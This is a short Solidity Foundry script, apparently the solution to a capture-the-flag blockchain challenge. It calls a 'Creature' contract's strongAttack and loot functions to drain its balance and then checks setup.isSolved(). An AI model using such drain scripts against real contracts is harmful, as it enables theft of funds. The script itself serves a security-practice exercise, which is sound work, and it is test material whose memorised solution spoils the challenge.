// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/Setup.sol";
import "../src/Creature.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract solve is Script{
    address private immutable target = 0x8509BACa97772eEaaC71C835f9A2AFDFf475666a;
    address private immutable setup_add = 0x00fC5503788844c400c5D5c8797F9B49A09247d9;
    function run() public {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        Setup setup = Setup(setup_add);
        Creature creature = Creature(target);
        creature.strongAttack(20);
        creature.loot();
        console.log(address(target).balance);
        console.log(setup.isSolved());
        vm.stopBroadcast(); 
    }
}